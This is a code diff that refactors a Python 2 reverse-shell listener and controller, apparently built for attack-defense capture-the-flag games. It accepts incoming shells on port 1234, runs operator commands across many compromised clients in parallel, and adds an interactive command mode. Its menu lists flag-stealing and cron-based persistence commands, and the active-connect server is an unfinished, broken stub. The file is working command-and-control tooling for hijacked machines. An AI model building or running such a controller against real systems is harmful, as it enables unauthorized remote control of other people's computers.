@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 
 import socket
+from Queue import Queue
 from threading import Thread, Lock, Condition
 from time import sleep
 from commander import Commander
@@ -16,18 +17,101 @@ from utils import log
 def md5(data):
     return hashlib.md5(data).hexdigest()
 
-class ListenServer():
-	def __init__(self, listen_address, commander_listen_address):
+class Server(object):
+	def __init__(self, commander_listen_address):
 		self.MAX_CONNECTION_NUMBER = 50
 		self._clients_lock = Lock()
 		self.clients = {}
 		self.target_clients = {}
+		self.executed_condition=Condition()
+		self.commander_listen_address = commander_listen_address
+
+	def _notifyExecuted(self):
+		self.executed_condition.acquire()
+		self.executed_condition.notifyAll()
+		self.executed_condition.release()
+
+	def waitExecute(self):
+		self.executed_condition.acquire()
+		self.executed_condition.wait()
+		self.executed_condition.release()
+
+	def setTargetClient(self, targets):
+		if targets == "a":
+			self.target_clients = self.clients
+			return True
+		else:
+			tmp={}
+			targets = re.split('[, ]', targets)
+			for i in targets:
+				for j in self.clients:
+					if j.startswith(i):
+						tmp[j]=self.clients[j]
+			if len(tmp) > 0:
+				self.target_clients=tmp
+				return True
+			else:
+				log.error('target error!', __name__)
+				return False
+
+	def removeClient(self, client_hash = None, host = None):
+		'''
+			use this method after release lock
+		'''
+		result = None
+		if not client_hash:
+			if host:
+				client_hash=md5(host)
+			else:
+				log.error('no args provide!',__name__)
+				return result
+
+		if client_hash in self.target_clients:
+			self.target_clients.pop(client_hash)
+
+		self._clients_lock.acquire()
+		for cl_hash in self.clients.keys():
+			if cl_hash.startswith(client_hash):
+				client = self.clients[cl_hash]
+				if not client.closeConn():
+					log.warn('(%s:%s)close client conn failed!'%(client.host,client.port), __name__)
+				result = cl_hash, self.clients.pop(cl_hash)
+		self._clients_lock.release()
+		if not result:
+			log.error('client not found!', __name__)
+		return result
+
+	def threadingRunCommand(self, cl_hash, client , command, timeout, resultQueue):
+		result = '*' * 6 + '(%s)%s'%(cl_hash, client) + '*' * 6 +'\n'
+		result += client.runCommand(command,timeout=timeout)+"\n"
+		resultQueue.put(result)
+
+	def runCommand(self, command, timeout=3):
+		result = ''
+		resultQueue = Queue()
+		threadList=[]
+		for cl_hash, client in self.target_clients.iteritems():
+			t=Thread(target=self.threadingRunCommand,args=(cl_hash,client,command,timeout,resultQueue))
+			threadList.append(t)
+			t.start()
+		for t in threadList:
+			t.join(timeout=timeout+1)
+		while not resultQueue.empty():
+			result += resultQueue.get()
+		return result
+
+	def stop(self):
+		for i in self.clients.keys():
+			self.removeClient(i)
+
+
+class ListenServer(Server):
+	def __init__(self, listen_address, commander_listen_address):
+		super(ListenServer,self).__init__(commander_listen_address)
 		self.listen_address = listen_address
 		self.listen_host=listen_address[0]
 		self.listen_port=listen_address[1]
 		self.binded_condition=Condition()
-		self.executed_condition=Condition()
-		self.commander_listen_address = commander_listen_address
 		
 	def _waitBind(self):
 		self.binded_condition.acquire()
@@ -39,7 +123,7 @@ class ListenServer():
 		self.binded_condition.notifyAll()
 		self.binded_condition.release()
 
-	def _notifyExecuted(self):
+	def notifyExecuted(self):
 		self.executed_condition.acquire()
 		self.executed_condition.notifyAll()
 		self.executed_condition.release()
@@ -82,16 +166,18 @@ class ListenServer():
 			info=\
 """
 Commands : 
-        [h] : show this help
-        [sh] : show informations,'t' for target,'a' for all
-        [t] : set command target, usage: 
-        	"t [clients_hash],([clients_hash])" ('a' for all, example : t a, t 1,5 ) 
-        [d] : delete client, usage : "d x.x.x.x"
-        [r] : send command to target clients, usage: "r [command]"
-        [adc] : add crontab, usage: "adc [content]"
-        [gf] : get flags
-        [ac] : add auto connection cron
-        [q|e] : exit   
+    [l] : set log level	(CRITICAL = 150,ERROR = 140,WARNING = 130,INFO = 120,DEBUG = 110,NOTSET = 100)
+    [h] : show this help
+    [sh] : show informations,'t' for target,'a' for all
+    [t] : set command target, usage: 
+    	"t [clients_hash],([clients_hash])" ('a' for all, example : t a, t 1,5 ) 
+    [d] : delete client, usage : "d x.x.x.x"
+    [r] : send command to target clients, usage: "r(timeout) [command]"(example :"r10 whoami")
+    [i] : interactive with target clients
+    [adc] : add crontab, usage: "adc [content]"
+    [gf] : get flags
+    [ac] : add auto connection cron
+    [q|e] : exit   
 """
 
 		elif name.startswith('a'):
@@ -134,57 +220,6 @@ Commands :
 					info = ',\n'.join(self.target_clients.values())
 		return info
 
-	def setTargetClient(self, targets):
-		if targets == "a":
-			self.target_clients = self.clients
-			return True
-		else:
-			tmp={}
-			targets = re.split('[, ]', targets)
-			for i in targets:
-				for j in self.clients:
-					if j.startswith(i):
-						tmp[j]=self.clients[j]
-			if len(tmp) > 0:
-				self.target_clients=tmp
-				return True
-			else:
-				log.error('target error!', __name__)
-				return False
-
-	def removeClient(self, client_hash = None, host = None):
-		'''
-			use this method after release lock
-		'''
-		result = None
-		if not client_hash:
-			if host:
-				client_hash=md5(host)
-			else:
-				log.error('no args provide!',__name__)
-				return result
-
-		if client_hash in self.target_clients:
-			self.target_clients.pop(client_hash)
-
-		self._clients_lock.acquire()
-		for cl_hash in self.clients.keys():
-			if cl_hash.startswith(client_hash):
-				if not self.clients[cl_hash].closeConn():
-					log.warn('close client conn failed!', __name__)
-				result = cl_hash, self.clients.pop(cl_hash)
-		self._clients_lock.release()
-		if not result:
-			log.error('client not found!', __name__)
-		return result
-
-	def runCommand(self, command):
-		result = ''
-		for cl_hash, client in self.target_clients.iteritems():
-			result += '*' * 6 + '(%s)%s'%(cl_hash, client) + '*' * 6 +'\n'
-			result += client.runCommand(command)
-		return result
-
 	def start(self):
 		self.listener = Thread(target = self._listen)
 		self.listener.setDaemon(True)
@@ -192,7 +227,6 @@ Commands :
 		self._waitBind()
 		self.commander = Commander(self,self.commander_listen_address)
 		while True:
-			self._notifyExecuted()
 			raw = self.commander.getCommand()
 			tmp = raw.split(' ', 1)
 			command = tmp[0]
@@ -200,7 +234,31 @@ Commands :
 			if command.startswith('e') or command.startswith('q'):
 				break
 			elif command == '':
-				continue
+				result = ""
+			elif command.startswith('l'):
+				levels={"CRITICAL" : 150,
+						"ERROR" : 140,
+						"WARNING" : 130,
+						"INFO" : 120,
+						"DEBUG" : 110,
+						"NOTSET" : 100,
+						150 : "CRITICAL",
+						140 : "ERROR",
+						130 : "WARNING",
+						120 : "INFO",
+						110 : "DEBUG",
+						100 : "NOTSET"}
+				if args.isdigit():
+					level=int(args)
+				elif args in levels:
+					level = levels[args]
+				else:
+					level = None
+				if level:
+					log.Logger.setLevel(level)
+					result="set log level to %s"%levels[level]
+				else:
+					result="wrong level!"
 			elif command.startswith('h'):
 				result=self.info('help')
 			elif command.startswith('sh'):
@@ -211,8 +269,23 @@ Commands :
 				tmp = self.removeClient(args)
 				result='removed: %s'%tmp
 			elif command.startswith('r'):
-				result=self.runCommand(args)
-
+				timeout=int(command[1:]) if command[1:].isdigit() else 4
+				if args == "":
+					self.commander.sendResult("(command mode,exit with 'qq')")
+					self.commander.command_prompt = "$"
+					while True:
+						raw = self.commander.getCommand()
+						if raw == "qq":
+							self.commander.command_prompt = ">"
+							result = "(exit command mode)"
+							break
+						if raw.strip() == "":
+							result=""
+						else:
+							result=self.runCommand(raw,timeout)
+						self.commander.sendResult(result)
+				else:
+					result=self.runCommand(args,timeout)
 			elif command.startswith('adc'):
 				pass #TODO
 			elif command.startswith('gf'):
@@ -222,15 +295,15 @@ Commands :
 			else:
 				log.error('invaild command!',__name__)
 				result=self.info('help')
-
 			self.commander.sendResult(result)
-			
 
-	def stop(self):
-		for i in self.clients.keys():
-			self.removeClient(i)
-
-
-a = ListenServer(('0.0.0.0', 1234), ('127.0.0.1', 0))
-a.start()
-a.stop()
+class ConnectServer:
+	"""TODO  active connect shell server"""
+	def __init__(self, arg):
+		super(connect_server, self).__init__()
+		self.arg = arg
+		
+if __name__ == "__main__":
+	a = ListenServer(('0.0.0.0', 1234), ('127.0.0.1', 0))
+	a.start()
+	a.stop()
